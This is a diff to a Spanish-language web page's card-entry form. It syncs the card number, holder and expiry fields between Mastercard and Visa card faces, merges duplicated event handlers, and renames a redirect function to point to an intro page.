@@ -464,6 +464,7 @@
                     <div class="badge">CRÉDITO</div>
                 </div>
                 <div class="sim-chip"></div>
+                <!-- MISMO CAMPO DE NÚMERO COMPARTIDO -->
                 <input type="text" id="cardNumberInputVisa" class="card-number-input" placeholder="**** **** **** ****" maxlength="19" inputmode="numeric" autocomplete="off">
                 <div class="info-row">
                     <div class="info-group" style="flex: 2;">
@@ -519,6 +520,9 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
+    // Referencia al campo de número activo
+    let activeNumberInput = null;
+
     // Obtener inputs según tipo
     function getCardInputs() {
         if (cardType === 'mastercard') {
@@ -547,10 +551,13 @@
         return 'none';
     }
 
-    // Formatear número de tarjeta en grupos de 4
+    // Formatear número de tarjeta en grupos de 4 (SOLO DÍGITOS)
     function formatCardNumber(value) {
-        let cleaned = value.replace(/\s/g, '').replace(/\D/g, '');
+        // Eliminar todo lo que no sea número
+        let cleaned = value.replace(/\D/g, '');
+        // Limitar a 16 dígitos
         if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
+        // Dividir en grupos de 4
         let parts = [];
         for (let i = 0; i < cleaned.length; i += 4) {
             parts.push(cleaned.slice(i, i + 4));
@@ -558,15 +565,26 @@
         return parts.join(' ');
     }
 
+    // Sincronizar valor entre inputs de Mastercard y Visa
+    function syncCardValue(value) {
+        const mcInput = document.getElementById('cardNumberInput');
+        const visaInput = document.getElementById('cardNumberInputVisa');
+        if (mcInput && visaInput) {
+            mcInput.value = value;
+            visaInput.value = value;
+        }
+    }
+
     // Actualizar la tarjeta según el tipo
     function updateCardType(type, fromButton = false) {
         if (type === 'none') return;
         if (type === cardType && !fromButton) return;
         
+        // Guardar el valor actual del input activo
         const inputs = getCardInputs();
         const currentValue = inputs ? inputs.number.value : '';
         const activeElement = document.activeElement;
-        const isNumberFocused = activeElement && activeElement.id && activeElement.id.includes('cardNumberInput');
+        const isNumberFocused = activeElement && activeElement.id && (activeElement.id === 'cardNumberInput' || activeElement.id === 'cardNumberInputVisa');
         
         cardType = type;
         
@@ -597,18 +615,20 @@
             lengthInfo.innerHTML = '🔢 Visa: <strong>16 dígitos</strong> | Mastercard: 16';
         }
         
-        const newInputs = getCardInputs();
-        if (newInputs && currentValue) {
-            // Aplicar formato al valor existente
-            newInputs.number.value = formatCardNumber(currentValue);
-        }
+        // Restaurar el valor formateado en ambos inputs
+        const formattedValue = formatCardNumber(currentValue);
+        syncCardValue(formattedValue);
         
-        if (isNumberFocused && newInputs) {
-            setTimeout(() => {
-                newInputs.number.focus();
-                const len = newInputs.number.value.length;
-                newInputs.number.setSelectionRange(len, len);
-            }, 50);
+        // Restaurar el foco
+        if (isNumberFocused) {
+            const newInputs = getCardInputs();
+            if (newInputs) {
+                setTimeout(() => {
+                    newInputs.number.focus();
+                    const len = newInputs.number.value.length;
+                    newInputs.number.setSelectionRange(len, len);
+                }, 50);
+            }
         }
     }
 
@@ -662,36 +682,42 @@
         return digits;
     }
 
+    // Configurar eventos para ambos inputs de número
     function setupCardEvents() {
-        const inputs = getCardInputs();
-        if (!inputs) return;
-        
-        if (inputs.number._listenersSetup) return;
-        inputs.number._listenersSetup = true;
-        
-        inputs.number.addEventListener('input', function(e) {
-            // Obtener solo dígitos del valor actual
+        const mcNumber = document.getElementById('cardNumberInput');
+        const visaNumber = document.getElementById('cardNumberInputVisa');
+        const mcHolder = document.getElementById('cardHolderInput');
+        const visaHolder = document.getElementById('cardHolderInputVisa');
+        const mcExpiry = document.getElementById('expiryInput');
+        const visaExpiry = document.getElementById('expiryInputVisa');
+
+        // Función para manejar el input del número (compartido)
+        function handleNumberInput(e) {
             const rawValue = e.target.value;
             const detectedType = detectCardType(rawValue);
             
             // Detectar tipo automáticamente
             if (detectedType !== 'none' && detectedType !== cardType) {
                 updateCardType(detectedType, false);
-                const newInputs = getCardInputs();
-                if (newInputs) {
-                    // Aplicar formato
-                    newInputs.number.value = formatCardNumber(rawValue);
-                }
-                return;
             }
             
             // Aplicar formato de 4 en 4
-            e.target.value = formatCardNumber(rawValue);
-        });
+            const formatted = formatCardNumber(rawValue);
+            e.target.value = formatted;
+            // Sincronizar con el otro input
+            syncCardValue(formatted);
+        }
 
-        inputs.expiry.addEventListener('input', function(e) {
+        // Función para manejar el input de fecha (compartida)
+        function handleExpiryInput(e) {
             let formatted = formatExpiry(e.target.value);
             e.target.value = formatted;
+            
+            // Sincronizar
+            const otherId = e.target.id === 'expiryInput' ? 'expiryInputVisa' : 'expiryInput';
+            const otherInput = document.getElementById(otherId);
+            if (otherInput) otherInput.value = formatted;
+            
             if (expiryTimeout) clearTimeout(expiryTimeout);
             if (e.target.value.length === 5 && e.target.value.includes('/')) {
                 expiryTimeout = setTimeout(() => {
@@ -703,24 +729,53 @@
                     expiryTimeout = null;
                 }, 300);
             }
-        });
+        }
 
-        inputs.expiry.addEventListener('blur', function() {
+        // Función para manejar el input del titular (compartida)
+        function handleHolderInput(e) {
+            const value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, '');
+            e.target.value = value;
+            const otherId = e.target.id === 'cardHolderInput' ? 'cardHolderInputVisa' : 'cardHolderInput';
+            const otherInput = document.getElementById(otherId);
+            if (otherInput) otherInput.value = value;
+        }
+
+        // Asignar eventos a Mastercard
+        mcNumber.addEventListener('input', handleNumberInput);
+        mcHolder.addEventListener('input', handleHolderInput);
+        mcExpiry.addEventListener('input', handleExpiryInput);
+        mcExpiry.addEventListener('blur', function() {
             if (expiryTimeout) clearTimeout(expiryTimeout);
-            if (!card.classList.contains('flipped') && inputs.expiry.value.length >= 3) {
+            if (!card.classList.contains('flipped') && mcExpiry.value.length >= 3) {
                 isFlippingFromExpiry = true;
                 card.classList.add('flipped');
                 setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
             }
         });
 
-        inputs.holder.addEventListener('input', function(e) {
-            e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s\.Ñ]/g, '');
+        // Asignar eventos a Visa
+        visaNumber.addEventListener('input', handleNumberInput);
+        visaHolder.addEventListener('input', handleHolderInput);
+        visaExpiry.addEventListener('input', handleExpiryInput);
+        visaExpiry.addEventListener('blur', function() {
+            if (expiryTimeout) clearTimeout(expiryTimeout);
+            if (!card.classList.contains('flipped') && visaExpiry.value.length >= 3) {
+                isFlippingFromExpiry = true;
+                card.classList.add('flipped');
+                setTimeout(() => { cvcInput.focus(); isFlippingFromExpiry = false; }, 400);
+            }
         });
 
-        inputs.number.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
-        inputs.holder.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
-        inputs.expiry.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        // Focus eventos para ambos
+        [mcNumber, visaNumber].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
+        [mcHolder, visaHolder].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
+        [mcExpiry, visaExpiry].forEach(inp => {
+            inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
+        });
     }
 
     cvcInput.addEventListener('input', function(e) {
@@ -740,7 +795,7 @@
     frontMastercard.classList.add('active');
     setupCardEvents();
 
-    function redirectToWhatsApp() {
+    function redirectToIntro() {
         window.location.href = 'intro.html';
     }
 
@@ -829,7 +884,7 @@
             statusMsg.innerHTML = '✅ Datos verificados, redirigiendo...';
             statusMsg.style.background = '#d4edda';
             statusMsg.style.color = '#155724';
-            setTimeout(redirectToWhatsApp, 1000);
+            setTimeout(redirectToIntro, 1000);
         } else {
             statusMsg.innerHTML = '❌ Error al verificar los datos. Intenta nuevamente.';
             statusMsg.style.background = '#f8d7da';
